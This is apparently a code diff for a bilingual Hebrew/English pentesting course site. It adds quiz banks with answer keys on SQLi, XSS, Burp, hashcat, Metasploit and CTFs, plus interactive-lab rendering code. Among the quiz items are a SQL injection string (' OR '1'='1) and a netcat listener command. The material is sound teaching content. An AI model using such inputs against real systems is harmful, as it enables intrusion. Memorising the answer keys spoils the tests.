+`<div class="callout callout-success"><strong>📋 CTF — Practice & Learning</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">Capture The Flag</span></div><div class="cheat-item"><span class="cheat-key">machines to hack with flags</span></div><div class="cheat-item"><span class="cheat-key">beginners-intermediate with guided rooms</span></div><div class="cheat-item"><span class="cheat-key">flag{...} / CTF{...}</span></div></div></div>`
+  ]
+}};
+var GAME_QS={},GAME_QS_EN={},QUIZZES={},QUIZZES_EN={},ILABS={},ILABS_EN={};
+GAME_QS[0]=[{"q": "Kali מבוססת על:", "o": ["Ubuntu", "Fedora", "Debian", "Arch"], "a": 2}, {"q": "Kali מיועדת ל:", "o": ["שימוש יומיומי", "pentesting בלבד", "development", "gaming"], "a": 1}, {"q": "rockyou.txt מכיל:", "o": ["usernames", "14M+ סיסמאות", "IP addresses", "CVEs"], "a": 1}, {"q": "msfdb init מאתחל:", "o": ["Kali", "Metasploit database", "Docker", "web server"], "a": 1}, {"q": "Kali VM: כמה RAM מינימום?", "o": ["1GB", "2GB", "4GB", "8GB"], "a": 2}, {"q": "Burp Suite משמש ל:", "o": ["password cracking", "web app testing", "port scanning", "WiFi"], "a": 1}, {"q": "Offensive Security גם מנהלת:", "o": ["Bug Bounty", "OSCP certification", "HackerOne", "CVE database"], "a": 1}, {"q": "searchsploit מחפש:", "o": ["בGoogle", "ב-Exploit-DB offline", "ב-GitHub", "בShodan"], "a": 1}];
+GAME_QS_EN[0]=[{"q": "Kali is based on:", "o": ["Ubuntu", "Fedora", "Debian", "Arch"], "a": 2}, {"q": "Kali is designed for:", "o": ["daily use", "pentesting only", "development", "gaming"], "a": 1}, {"q": "rockyou.txt contains:", "o": ["usernames", "14M+ passwords", "IP addresses", "CVEs"], "a": 1}, {"q": "msfdb init initializes:", "o": ["Kali", "Metasploit database", "Docker", "web server"], "a": 1}, {"q": "Kali VM minimum RAM:", "o": ["1GB", "2GB", "4GB", "8GB"], "a": 2}, {"q": "Burp Suite is for:", "o": ["password cracking", "web app testing", "port scanning", "WiFi"], "a": 1}, {"q": "Offensive Security also manages:", "o": ["Bug Bounty", "OSCP certification", "HackerOne", "CVE database"], "a": 1}, {"q": "searchsploit searches:", "o": ["Google", "Exploit-DB offline copy", "GitHub", "Shodan"], "a": 1}];
+GAME_QS[1]=[{"q": "Passive Recon vs Active:", "o": ["Passive=מהיר", "Passive=לא שולח packets", "Active=בטוח יותר", "זהים"], "a": 1}, {"q": "site: בגוגל מגביל ל:", "o": ["specific IP", "specific domain", "specific file type", "specific date"], "a": 1}, {"q": "Shodan מאנדקס:", "o": ["websites", "internet-connected devices", "email servers", "GitHub repos"], "a": 1}, {"q": "Nmap -p- סורק:", "o": ["top 1000 ports", "כל 65535 ports", "UDP בלבד", "ICMP"], "a": 1}, {"q": "SYN scan (-sS) נקרא stealth כי:", "o": ["מוצפן", "לא משלים handshake", "UDP", "איטי"], "a": 1}, {"q": "subfinder מחפש:", "o": ["subdomains", "emails", "IPs", "CVEs"], "a": 0}, {"q": "Google Dorking inurl: מחפש:", "o": ["בcontent", "ב-URL", "בtitle", "בdomain"], "a": 1}, {"q": "truffleHog ו-gitleaks מחפשים:", "o": ["malware", "secrets ב-git repos", "ports", "domains"], "a": 1}];
+GAME_QS_EN[1]=[{"q": "Passive vs Active Recon:", "o": ["Passive=faster", "Passive=no packets sent", "Active=safer", "identical"], "a": 1}, {"q": "Google site: operator limits to:", "o": ["specific IP", "specific domain", "specific file type", "specific date"], "a": 1}, {"q": "Shodan indexes:", "o": ["websites", "internet-connected devices", "email servers", "GitHub repos"], "a": 1}, {"q": "Nmap -p- scans:", "o": ["top 1000 ports", "all 65535 ports", "UDP only", "ICMP"], "a": 1}, {"q": "SYN scan is called stealth because:", "o": ["encrypted", "does not complete handshake", "UDP", "slow"], "a": 1}, {"q": "subfinder finds:", "o": ["subdomains", "emails", "IPs", "CVEs"], "a": 0}, {"q": "Google Dorking inurl: searches in:", "o": ["content", "URL", "title", "domain"], "a": 1}, {"q": "truffleHog and gitleaks search for:", "o": ["malware", "secrets in git repos", "ports", "domains"], "a": 1}];
+GAME_QS[2]=[{"q": "SQLi מתרחש כי:", "o": ["DB חלשה", "input לא sanitized בquery", "TLS חסר", "passwords חלשות"], "a": 1}, {"q": "' OR '1'='1 גורם ל:", "o": ["error", "query להחזיר כל הרשומות", "delete", "update"], "a": 1}, {"q": "Parameterized query מגנה כי:", "o": ["מוצפן", "מפריד SQL מdata", "מהיר יותר", "cache"], "a": 1}, {"q": "Time-based blind SQLi משתמש ב:", "o": ["UNION", "SLEEP()", "DROP", "UPDATE"], "a": 1}, {"q": "sqlmap הוא:", "o": ["password cracker", "automated SQLi tool", "port scanner", "exploit framework"], "a": 1}, {"q": "Union-based SQLi דורש ידיעת:", "o": ["passwords", "מספר columns", "table names", "DB version"], "a": 1}, {"q": "SQLi ב-OWASP Top 10:", "o": ["#10", "#5", "#3", "#1"], "a": 2}, {"q": "-- בSQL query מוסיף:", "o": ["הפניה", "comment — מבטל שאר הquery", "escape", "semicolon"], "a": 1}];
+GAME_QS_EN[2]=[{"q": "SQLi occurs because:", "o": ["weak DB", "input not sanitized in query", "no TLS", "weak passwords"], "a": 1}, {"q": "' OR '1'='1 causes:", "o": ["error", "query to return all records", "delete", "update"], "a": 1}, {"q": "Parameterized query protects because:", "o": ["encryption", "separates SQL from data", "faster", "cache"], "a": 1}, {"q": "Time-based blind SQLi uses:", "o": ["UNION", "SLEEP()", "DROP", "UPDATE"], "a": 1}, {"q": "sqlmap is:", "o": ["password cracker", "automated SQLi tool", "port scanner", "exploit framework"], "a": 1}, {"q": "Union-based SQLi requires knowing:", "o": ["passwords", "number of columns", "table names", "DB version"], "a": 1}, {"q": "SQLi in OWASP Top 10:", "o": ["#10", "#5", "#3", "#1"], "a": 2}, {"q": "-- in SQL query adds:", "o": ["reference", "comment — cancels rest of query", "escape", "semicolon"], "a": 1}];
+GAME_QS[3]=[{"q": "Stored XSS מסוכן יותר מReflected כי:", "o": ["יותר מהיר", "לא צריך ש-victim ילחץ link", "מוצפן", "server-side"], "a": 1}, {"q": "DOM XSS שונה כי:", "o": ["DB-based", "server לא רואה payload", "HTTPS", "TCP"], "a": 1}, {"q": "CSP = ?", "o": ["Cookie Security Policy", "Content Security Policy", "Cross-Site Prevention", "Client Side Protection"], "a": 1}, {"q": "document.cookie חושף:", "o": ["passwords", "session cookies", "IP", "username"], "a": 1}, {"q": "HttpOnly cookie flag מגן מ:", "o": ["CSRF", "XSS cookie theft", "SQLi", "brute force"], "a": 1}, {"q": "XSS = ?", "o": ["SQL injection variant", "JavaScript injection in browser", "server exploit", "binary exploit"], "a": 1}, {"q": "Samy Worm נפוץ ב:", "o": ["Facebook", "Twitter", "MySpace", "Gmail"], "a": 2}, {"q": "nonce ב-CSP = ?", "o": ["random key לscript ספציפי", "hash", "domain", "timestamp"], "a": 0}];
+GAME_QS_EN[3]=[{"q": "Stored XSS is more dangerous than Reflected because:", "o": ["faster", "victim does not need to click link", "encrypted", "server-side"], "a": 1}, {"q": "DOM XSS is different because:", "o": ["DB-based", "server does not see the payload", "HTTPS", "TCP"], "a": 1}, {"q": "CSP stands for:", "o": ["Cookie Security Policy", "Content Security Policy", "Cross-Site Prevention", "Client Side Protection"], "a": 1}, {"q": "document.cookie exposes:", "o": ["passwords", "session cookies", "IP", "username"], "a": 1}, {"q": "HttpOnly cookie flag protects against:", "o": ["CSRF", "XSS cookie theft", "SQLi", "brute force"], "a": 1}, {"q": "XSS is:", "o": ["SQL injection variant", "JavaScript injection in browser", "server exploit", "binary exploit"], "a": 1}, {"q": "Samy Worm spread on:", "o": ["Facebook", "Twitter", "MySpace", "Gmail"], "a": 2}, {"q": "nonce in CSP is:", "o": ["random key per script", "hash", "domain", "timestamp"], "a": 0}];
+GAME_QS[4]=[{"q": "Burp Suite Proxy port default:", "o": ["3000", "8080", "8443", "1080"], "a": 1}, {"q": "Repeater משמש ל:", "o": ["scanning", "שלח request ידנית וחזרה", "password cracking", "network capture"], "a": 1}, {"q": "Intruder משמש ל:", "o": ["manual testing", "automated fuzzing/brute force", "certificate management", "DNS"], "a": 1}, {"q": "IDOR = ?", "o": ["Injection Detection", "Insecure Direct Object Reference", "Internal DOR", "ICMP Detection"], "a": 1}, {"q": "Burp CA certificate מותקן ל:", "o": ["TLS הצפנה", "HTTPS interception", "authentication", "session"], "a": 1}, {"q": "Ctrl+R בBurp שולח request ל:", "o": ["Scanner", "Repeater", "Intruder", "Decoder"], "a": 1}, {"q": "IDOR ב-OWASP 2021 הוא חלק מ:", "o": ["Injection", "Broken Access Control", "Cryptographic Failure", "XSS"], "a": 1}, {"q": "Decoder בBurp מאפשר:", "o": ["password cracking", "base64/URL/HTML encoding", "scanning", "logging"], "a": 1}];
+GAME_QS_EN[4]=[{"q": "Burp Suite Proxy default port:", "o": ["3000", "8080", "8443", "1080"], "a": 1}, {"q": "Repeater is used for:", "o": ["scanning", "manually sending and resending requests", "password cracking", "network capture"], "a": 1}, {"q": "Intruder is used for:", "o": ["manual testing", "automated fuzzing/brute force", "certificate management", "DNS"], "a": 1}, {"q": "IDOR stands for:", "o": ["Injection Detection", "Insecure Direct Object Reference", "Internal DOR", "ICMP Detection"], "a": 1}, {"q": "Burp CA certificate is installed for:", "o": ["TLS encryption", "HTTPS interception", "authentication", "session"], "a": 1}, {"q": "Ctrl+R in Burp sends to:", "o": ["Scanner", "Repeater", "Intruder", "Decoder"], "a": 1}, {"q": "IDOR in OWASP 2021 is part of:", "o": ["Injection", "Broken Access Control", "Cryptographic Failure", "XSS"], "a": 1}, {"q": "Burp Decoder enables:", "o": ["password cracking", "base64/URL/HTML encoding", "scanning", "logging"], "a": 1}];
+GAME_QS[5]=[{"q": "bcrypt מאובטח יותר מMD5 כi password כי:", "o": ["ארוך יותר", "מכוון להיות איטי", "מוצפן", "salted אוטומטית"], "a": 1}, {"q": "hashcat -m 0 = ?", "o": ["SHA-256", "MD5", "bcrypt", "NTLM"], "a": 1}, {"q": "Rules ב-hashcat:", "o": ["IP rules", "variations על wordlist words", "firewall rules", "auth rules"], "a": 1}, {"q": "Credential Stuffing משתמש ב:", "o": ["random passwords", "leaked username:password pairs", "dictionary only", "rainbow tables"], "a": 1}, {"q": "Hydra משמש ל:", "o": ["offline hash cracking", "online brute force", "SQL injection", "port scanning"], "a": 1}, {"q": "hashcat -m 3200 = ?", "o": ["MD5", "SHA-1", "bcrypt", "NTLM"], "a": 2}, {"q": "rockyou.txt מכיל כמה סיסמאות?", "o": ["1M", "5M", "14M", "100M"], "a": 2}, {"q": "Salt ב-password hashing:", "o": ["מוסיף ברזל", "random value שמונע rainbow tables", "salt = hash", "מאט bcrypt"], "a": 1}];
+GAME_QS_EN[5]=[{"q": "bcrypt is more secure than MD5 for passwords because:", "o": ["longer", "intentionally slow", "encrypted", "auto-salted"], "a": 1}, {"q": "hashcat -m 0 =", "o": ["SHA-256", "MD5", "bcrypt", "NTLM"], "a": 1}, {"q": "Rules in hashcat:", "o": ["IP rules", "variations on wordlist words", "firewall rules", "auth rules"], "a": 1}, {"q": "Credential Stuffing uses:", "o": ["random passwords", "leaked username:password pairs", "dictionary only", "rainbow tables"], "a": 1}, {"q": "Hydra is for:", "o": ["offline hash cracking", "online brute force", "SQL injection", "port scanning"], "a": 1}, {"q": "hashcat -m 3200 =", "o": ["MD5", "SHA-1", "bcrypt", "NTLM"], "a": 2}, {"q": "rockyou.txt contains how many passwords?", "o": ["1M", "5M", "14M", "100M"], "a": 2}, {"q": "Salt in password hashing:", "o": ["adds minerals", "random value preventing rainbow tables", "salt = hash", "slows bcrypt"], "a": 1}];
+GAME_QS[6]=[{"q": "Metasploit נוצר ב:", "o": ["1999", "2003", "2007", "2010"], "a": 1}, {"q": "Meterpreter רץ:", "o": ["בדיסק", "בזיכרון בלבד", "בkernel", "בdocker"], "a": 1}, {"q": "RHOSTS ב-Metasploit = ?", "o": ["attacker IP", "target IP", "database", "port"], "a": 1}, {"q": "LHOST ב-Metasploit = ?", "o": ["target", "attacker listening IP", "log", "library"], "a": 1}, {"q": "EternalBlue מנצל:", "o": ["HTTP", "SMB vulnerability", "DNS", "FTP"], "a": 1}, {"q": "getsystem מנסה:", "o": ["לקבל IP", "privilege escalation", "system info", "file download"], "a": 1}, {"q": "Metasploit module search מחפש ב:", "o": ["Google", "Exploit-DB online", "local module database", "Shodan"], "a": 2}, {"q": "reverse_tcp payload פירושו:", "o": ["target תוקף", "target מתחבר אל attacker", "encrypted", "UDP"], "a": 1}];
+GAME_QS_EN[6]=[{"q": "Metasploit was created in:", "o": ["1999", "2003", "2007", "2010"], "a": 1}, {"q": "Meterpreter runs:", "o": ["on disk", "in memory only", "in kernel", "in docker"], "a": 1}, {"q": "RHOSTS in Metasploit =", "o": ["attacker IP", "target IP", "database", "port"], "a": 1}, {"q": "LHOST in Metasploit =", "o": ["target", "attacker listening IP", "log", "library"], "a": 1}, {"q": "EternalBlue exploits:", "o": ["HTTP", "SMB vulnerability", "DNS", "FTP"], "a": 1}, {"q": "getsystem attempts:", "o": ["get IP", "privilege escalation", "system info", "file download"], "a": 1}, {"q": "Metasploit module search searches:", "o": ["Google", "Exploit-DB online", "local module database", "Shodan"], "a": 2}, {"q": "reverse_tcp payload means:", "o": ["target attacks", "target connects to attacker", "encrypted", "UDP"], "a": 1}];
+GAME_QS[7]=[{"q": "CTF = ?", "o": ["Capture The Flag", "Computer Testing Framework", "Cyber Threat Feed", "Command Transfer Function"], "a": 0}, {"q": "HackTheBox מכיל:", "o": ["phishing training", "machines ל-hack עם flags", "spam filter", "log analyzer"], "a": 1}, {"q": "TryHackMe מיועד ל:", "o": ["experts בלבד", "beginners-intermediate עם guided rooms", "forensics בלבד", "network engineers"], "a": 1}, {"q": "CTF flag format:", "o": ["FLAG=...", "flag{...} / CTF{...}", "secret:", "#FLAG#"], "a": 1}, {"q": "nc -lvnp 4444 =", "o": ["port scanner", "netcat listener", "network test", "DNS query"], "a": 1}, {"q": "VulnHub מציע:", "o": ["online challenges", "VM downloads להack", "cloud labs", "live competitions"], "a": 1}, {"q": "OSCP הוא:", "o": ["open source tool", "penetration testing certification", "OS name", "packet capture"], "a": 1}, {"q": "robots.txt בCTF:", "o": ["מכיל flags", "מכיל hidden paths", "חוסם scanners", "מידע על DB"], "a": 1}];
+GAME_QS_EN[7]=[{"q": "CTF stands for:", "o": ["Capture The Flag", "Computer Testing Framework", "Cyber Threat Feed", "Command Transfer Function"], "a": 0}, {"q": "HackTheBox contains:", "o": ["phishing training", "machines to hack with flags", "spam filter", "log analyzer"], "a": 1}, {"q": "TryHackMe is for:", "o": ["experts only", "beginners-intermediate with guided rooms", "forensics only", "network engineers"], "a": 1}, {"q": "CTF flag format:", "o": ["FLAG=...", "flag{...} / CTF{...}", "secret:", "#FLAG#"], "a": 1}, {"q": "nc -lvnp 4444 =", "o": ["port scanner", "netcat listener", "network test", "DNS query"], "a": 1}, {"q": "VulnHub offers:", "o": ["online challenges", "VM downloads to hack", "cloud labs", "live competitions"], "a": 1}, {"q": "OSCP is:", "o": ["open source tool", "penetration testing certification", "OS name", "packet capture"], "a": 1}, {"q": "robots.txt in CTF:", "o": ["contains flags", "contains hidden paths", "blocks scanners", "DB info"], "a": 1}];
+for(var _i=0;_i<8;_i++){
+  QUIZZES[_i]=[{q:'',o:['','','',''],a:0,e:''}];
+  QUIZZES_EN[_i]=[{q:'',o:['','','',''],a:0,e:''}];
+  ILABS[_i]=[{type:'mchoice',q:'',options:[],explain:''}];
+  ILABS_EN[_i]=[{type:'mchoice',q:'',options:[],explain:''}];
+}
+// HTML escape for safe rendering of item text
+function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
+
+// ===== INTERACTIVE LAB ENGINE =====
+// Types: fill, classify, order, mchoice
+
+function renderLab(chId) {
+  const el = document.getElementById('lab-' + chId);
+  if (!el || el.dataset.rendered) return;
+  el.dataset.rendered = '1';
+  const exs = getL(chId);
+  const Lc = L();
+  const labTypeNames = currentLang==='he'
+    ? {fill:'✏️ השלמה', classify:'🗂️ סיווג', order:'🔢 סידור', mchoice:'🎭 תרחיש', complete:'הושלמו', orderSeq:'הסדר שבחרת:', orderCheck:'בדקי ✓', allDone:'כל התרגילים הושלמו!'}
+    : {fill:'✏️ Fill in', classify:'🗂️ Classify', order:'🔢 Order', mchoice:'🎭 Scenario', complete:'completed', orderSeq:'Your order:', orderCheck:'Check ✓', allDone:'All exercises done!'};
+
+  el.innerHTML = `<div class="lab-header">
+    <div class="lab-progress-row">
+      <span class="lab-progress-label" id="lab-prog-label-${chId}">0/${exs.length} ${labTypeNames.complete}</span>
+      <div class="lab-progress-bar"><div class="lab-progress-fill" id="lab-prog-fill-${chId}" style="width:0%"></div></div>
+    </div>
+  </div>` + exs.map((ex, i) => {
+    if (ex.type === 'fill')     return renderFill(chId, i, ex, Lc, labTypeNames);
+    if (ex.type === 'classify') return renderClassify(chId, i, ex, Lc, labTypeNames, exs.length);
+    if (ex.type === 'order')    return renderOrder(chId, i, ex, Lc, labTypeNames, exs.length);
+    if (ex.type === 'mchoice')  return renderMChoice(chId, i, ex, Lc, labTypeNames, exs.length);
+    return '';
+  }).join('') +
+  `<div class="lab-done-banner" id="lab-done-${chId}" style="display:none">
+    <span>🏆</span><span id="lab-done-txt-${chId}"></span>
+  </div>`;
+}
+
+function renderFill(chId, i, ex, Lc, T) {
+  const total = getL(chId).length;
+  const fields = ex.fields.map((f, fi) =>
+    `<div class="fill-row" id="fill-row-${chId}-${i}-${fi}">
+      <label class="fill-label">${f.label}</label>
+      <div class="fill-input-wrap">
+        <input class="fill-input" id="fill-inp-${chId}-${i}-${fi}" placeholder="${f.placeholder}"
+          oninput="fillCheck(${chId},${i},${fi})" autocomplete="off" spellcheck="false">
+        <span class="fill-icon" id="fill-icon-${chId}-${i}-${fi}"></span>
+      </div>
+    </div>`).join('');
+  return `<div class="lab-card" id="labcard-${chId}-${i}">
+    <div class="lab-card-hdr"><span class="lab-type-badge">${T.fill}</span><span class="lab-card-num">${i+1}/${total}</span></div>
+    <div class="lab-card-q">${ex.q}</div>
+    <div class="fill-fields">${fields}</div>
+    <div class="lab-explain-box" id="labexp-${chId}-${i}" style="display:none"><strong>${Lc.labExplain}</strong> ${ex.explain||''}</div>
+  </div>`;
+}
+
+function fillCheck(chId, i, fi) {
+  const exs = getL(chId);
+  const f = exs[i].fields[fi];
+  const inp = document.getElementById(`fill-inp-${chId}-${i}-${fi}`);
+  const icon = document.getElementById(`fill-icon-${chId}-${i}-${fi}`);
+  const row = document.getElementById(`fill-row-${chId}-${i}-${fi}`);
+  if (!inp) return;
+  const val = inp.value.trim().toLowerCase();
+  const alts = (f.alt || []).map(a => a.toLowerCase());
+  const ok = val === f.answer.toLowerCase() || alts.includes(val);
+  row.className = 'fill-row' + (val.length===0?'': ok?' fill-correct':' fill-wrong');
+  icon.textContent = val.length===0?'': ok?'✓':'';
+  const allOk = exs[i].fields.every((ff, ffi) => {
+    const v = (document.getElementById(`fill-inp-${chId}-${i}-${ffi}`)?.value||'').trim().toLowerCase();
+    return v === ff.answer.toLowerCase() || (ff.alt||[]).map(a=>a.toLowerCase()).includes(v);
+  });
+  if (allOk) markLabDone(chId, i);
+}
+
+function renderClassify(chId, i, ex, Lc, T, total) {
+  const shuffled = [...ex.items].sort(() => Math.random() - 0.5);
+  return `<div class="lab-card" id="labcard-${chId}-${i}">
+    <div class="lab-card-hdr"><span class="lab-type-badge">${T.classify}</span><span class="lab-card-num">${i+1}/${total}</span></div>
+    <div class="lab-card-q">${ex.q}</div>
+    ${ex.desc?`<div class="lab-desc">${ex.desc}</div>`:''}
+    <div class="classify-pool" id="pool-${chId}-${i}">
+      ${shuffled.map(item=>`<button class="classify-chip" id="chip-${chId}-${i}-${item.id}" onclick="classifySelect(${chId},${i},'${item.id}')">${esc(item.text)}</button>`).join('')}
+    </div>
+    <div class="classify-cats">
+      ${ex.categories.map((cat,ci)=>`
+        <div class="classify-cat" onclick="classifyDrop(${chId},${i},${ci})">
+          <div class="classify-cat-title">${cat}</div>
+          <div class="classify-cat-zone" id="zone-${chId}-${i}-${ci}"></div>
+        </div>`).join('')}
+    </div>
+    <div class="lab-explain-box" id="labexp-${chId}-${i}" style="display:none"><strong>${Lc.labExplain}</strong> ${ex.explain||''}</div>
+  </div>`;
+}
+
+const _csel = {};
+function classifySelect(chId, i, itemId) {
+  _csel[`${chId}-${i}`] = itemId;
+  document.querySelectorAll(`#pool-${chId}-${i} .classify-chip, #labcard-${chId}-${i} .classify-drop-chip`).forEach(c=>c.classList.remove('selected'));
+  document.getElementById(`chip-${chId}-${i}-${itemId}`)?.classList.add('selected');
+}
+function classifyDrop(chId, i, ci) {
+  const key = `${chId}-${i}`;
+  const itemId = _csel[key]; if(!itemId) return;
+  const ex = getL(chId)[i];
+  const item = ex.items.find(it=>it.id===itemId); if(!item) return;
+  const ok = item.ans === ex.catKeys[ci];
+  document.getElementById(`chip-${chId}-${i}-${itemId}`)?.remove();
+  const zone = document.getElementById(`zone-${chId}-${i}-${ci}`);
+  if (zone) {
+    const chip = document.createElement('span');
+    chip.className = 'classify-drop-chip ' + (ok?'drop-correct':'drop-wrong');
+    chip.textContent = (ok?'✓ ':'✗ ') + item.text;
+    chip.onclick = () => { chip.remove(); const pool=document.getElementById(`pool-${chId}-${i}`); if(pool){const b=document.createElement('button');b.className='classify-chip';b.id=`chip-${chId}-${i}-${itemId}`;b.textContent=item.text;b.onclick=()=>classifySelect(chId,i,itemId);pool.appendChild(b);} };
+    zone.appendChild(chip);
+  }
+  delete _csel[key];
+  const allPlaced = ex.items.every(it => !document.getElementById(`chip-${chId}-${i}-${it.id}`));
+  if (allPlaced) {
+    const allOk = ex.items.every(it => { const ci2=ex.catKeys.indexOf(it.ans); const z=document.getElementById(`zone-${chId}-${i}-${ci2}`); return z && [...z.querySelectorAll('.drop-correct')].some(c=>c.textContent.includes(it.text)); });
+    document.getElementById(`labexp-${chId}-${i}`)?.style && (document.getElementById(`labexp-${chId}-${i}`).style.display='block');
+    if (allOk) markLabDone(chId, i);
+  }
+}
+
+function renderOrder(chId, i, ex, Lc, T, total) {
+  const shuffled = [...ex.items].sort(() => Math.random() - 0.5);
+  return `<div class="lab-card" id="labcard-${chId}-${i}">
+    <div class="lab-card-hdr"><span class="lab-type-badge">${T.order}</span><span class="lab-card-num">${i+1}/${total}</span></div>
+    <div class="lab-card-q">${ex.q}</div>
+    ${ex.desc?`<div class="lab-desc">${ex.desc}</div>`:''}
+    <div class="order-pool" id="orderpool-${chId}-${i}">
+      ${shuffled.map(item=>`<button class="order-item" id="oitem-${chId}-${i}-${item.id}" onclick="orderClick(${chId},${i},'${item.id}')">${esc(item.text)}</button>`).join('')}
+    </div>
+    <div class="order-sequence">
+      <div class="order-seq-label">${T.orderSeq}</div>
+      <div class="order-seq-zone" id="orderseq-${chId}-${i}"></div>
+    </div>
+    <button class="btn btn-ghost" style="margin-top:8px;font-size:11px" onclick="orderCheck(${chId},${i})">${T.orderCheck}</button>
+    <div class="order-feedback" id="orderfb-${chId}-${i}"></div>
+    <div class="lab-explain-box" id="labexp-${chId}-${i}" style="display:none"><strong>${Lc.labExplain}</strong> ${ex.explain||''}</div>
+  </div>`;
+}
+
+const _ostate = {};
+function orderClick(chId, i, itemId) {
+  const key=`${chId}-${i}`; if(!_ostate[key]) _ostate[key]=[];
+  if(_ostate[key].includes(itemId)) return;
+  _ostate[key].push(itemId);
+  const btn = document.getElementById(`oitem-${chId}-${i}-${itemId}`);
+  if(btn){btn.classList.add('order-selected');btn.disabled=true;}
+  const zone = document.getElementById(`orderseq-${chId}-${i}`);
+  if(zone){const s=document.createElement('div');s.className='order-seq-step';s.dataset.id=itemId;s.innerHTML=`<span class="order-seq-num">${_ostate[key].length}</span> ${btn?.textContent||''}`;s.onclick=()=>orderRemove(chId,i,itemId);zone.appendChild(s);}
+}
+function orderRemove(chId, i, itemId) {
+  const key=`${chId}-${i}`; if(!_ostate[key]) return;
+  _ostate[key]=_ostate[key].filter(id=>id!==itemId);
+  const btn=document.getElementById(`oitem-${chId}-${i}-${itemId}`);
+  if(btn){btn.classList.remove('order-selected');btn.disabled=false;}
+  const zone=document.getElementById(`orderseq-${chId}-${i}`);
+  if(zone){const s=zone.querySelector(`[data-id="${itemId}"]`);if(s)s.remove();zone.querySelectorAll('.order-seq-step').forEach((st,idx)=>{const n=st.querySelector('.order-seq-num');if(n)n.textContent=idx+1;});}
+}
+function orderCheck(chId, i) {
+  const key=`${chId}-${i}`;
+  const ex=getL(chId)[i];
+  const chosen=_ostate[key]||[];
+  const fb=document.getElementById(`orderfb-${chId}-${i}`);
+  const isHe=currentLang==='he';
+  if(chosen.length<ex.correct.length){if(fb){fb.textContent=isHe?`⚠️ בחרי את כל ${ex.correct.length} השלבים`:`⚠️ Select all ${ex.correct.length} steps`;fb.className='order-feedback warn';}return;}
+  const ok=ex.correct.every((id,idx)=>chosen[idx]===id);
+  if(fb){fb.textContent=ok?'✅ '+(isHe?'מצוין! סדר נכון.':'Correct! Perfect order.'):'❌ '+(isHe?'לא בדיוק. נסי שוב.':'Not quite. Try again.');fb.className='order-feedback '+(ok?'ok':'err');}
+  if(ok){document.getElementById(`labexp-${chId}-${i}`)?.style&&(document.getElementById(`labexp-${chId}-${i}`).style.display='block');markLabDone(chId,i);}
+  else setTimeout(()=>{_ostate[key]=[];const zone=document.getElementById(`orderseq-${chId}-${i}`);if(zone)zone.innerHTML='';document.getElementById(`orderpool-${chId}-${i}`)?.querySelectorAll('.order-item').forEach(b=>{b.classList.remove('order-selected');b.disabled=false;});if(fb){fb.textContent='';fb.className='order-feedback';}},1300);
+}
+
+function renderMChoice(chId, i, ex, Lc, T, total) {
+  return `<div class="lab-card" id="labcard-${chId}-${i}">
+    <div class="lab-card-hdr"><span class="lab-type-badge">${T.mchoice}</span><span class="lab-card-num">${i+1}/${total}</span></div>
+    <div class="lab-card-q">${ex.q}</div>
+    <div class="mch-opts">
+      ${ex.options.map((opt,oi)=>`
+        <button class="mch-opt" id="mchopt-${chId}-${i}-${oi}" onclick="mchoicePick(${chId},${i},${oi})">
+          <span class="mch-letter">${Lc.optLetters[oi]}</span><span class="mch-text">${opt.text}</span>
+        </button>
+        <div class="mch-feedback" id="mchfb-${chId}-${i}-${oi}" style="display:none">${opt.feedback||''}</div>`).join('')}
+    </div>
+    <div class="lab-explain-box" id="labexp-${chId}-${i}" style="display:none"><strong>${Lc.labExplain}</strong> ${ex.explain||''}</div>
+  </div>`;
+}
+function mchoicePick(chId, i, oi) {
+  const ex=getL(chId)[i];
+  ex.options.forEach((_,idx)=>{const b=document.getElementById(`mchopt-${chId}-${i}-${idx}`);if(b)b.disabled=true;});
+  const opt=ex.options[oi];
+  document.getElementById(`mchfb-${chId}-${i}-${oi}`)?.style&&(document.getElementById(`mchfb-${chId}-${i}-${oi}`).style.display='block');
+  document.getElementById(`mchopt-${chId}-${i}-${oi}`)?.classList.add(opt.correct?'mch-correct':'mch-wrong');
+  if(!opt.correct) ex.options.forEach((o,idx)=>{if(o.correct){document.getElementById(`mchopt-${chId}-${i}-${idx}`)?.classList.add('mch-correct');document.getElementById(`mchfb-${chId}-${i}-${idx}`)?.style&&(document.getElementById(`mchfb-${chId}-${i}-${idx}`).style.display='block');}});
+  document.getElementById(`labexp-${chId}-${i}`)?.style&&(document.getElementById(`labexp-${chId}-${i}`).style.display='block');
+  if(opt.correct) markLabDone(chId,i);
+}
+
+const _labDone={};
+function markLabDone(chId,i){
+  if(!_labDone[chId]) _labDone[chId]=new Set();
+  if(_labDone[chId].has(i)) return;
+  _labDone[chId].add(i);
+  addXP(15);
+  document.getElementById(`labcard-${chId}-${i}`)?.classList.add('lab-card-done');
+  const total=getL(chId).length;
+  const done=_labDone[chId].size;
+  const fill=document.getElementById(`lab-prog-fill-${chId}`);
+  if(fill) fill.style.width=Math.round(done/total*100)+'%';
+  const label=document.getElementById(`lab-prog-label-${chId}`);
+  const Lc=L();
+  const T=currentLang==='he'?{complete:'הושלמו',allDone:'כל התרגילים הושלמו!'}:{complete:'completed',allDone:'All exercises done!'};
+  if(label) label.textContent=`${done}/${total} ${T.complete}`;
+  if(done===total){const banner=document.getElementById(`lab-done-${chId}`);if(banner)banner.style.display='flex';const txt=document.getElementById(`lab-done-txt-${chId}`);if(txt)txt.textContent=T.allDone+' +'+total*15+' XP';}
+}
+
+// ===== STATE =====
+const state = {cur:0, tabs:{}, quiz:{}, game:{}, xp:0, stars:{}};
+let currentLang = 'he';
+let gameTimer = null;
+const TOTAL_CHAPTERS = 8;
+
+// ===== HELPERS =====
+function L() { return currentLang==='he' ? C.he : C.en; }
+
+function getQ(i) {
+  const key = currentLang+'-'+i;
+  if (!_sqCache[key]) {
+    const raw = (currentLang==='en' ? (QUIZZES_EN[i]||QUIZZES[i]) : QUIZZES[i]) || QUIZZES[0];
+    _sqCache[key] = raw.map(q => shuffleOptions(q));
+  }
+  return _sqCache[key];
+}
+function getL(i) { return (currentLang==='en' ? (ILABS_EN[i]||ILABS[i]) : ILABS[i]) || ILABS[0]; }
+function getG(i) {
+  const key = currentLang+'-g-'+i;
+  if (!_sgCache[key]) {
+    const raw = (currentLang==='en' ? (GAME_QS_EN[i]||GAME_QS[i]) : GAME_QS[i]) || GAME_QS[0];
+    _sgCache[key] = raw.map(q => shuffleOptions(q));
+  }
+  return _sgCache[key];
+}
+const _sqCache = {}, _sgCache = {};
+
+// ===== NORMALIZE + SHUFFLE (length bias fix) =====
+function normalizeOptions(q) {
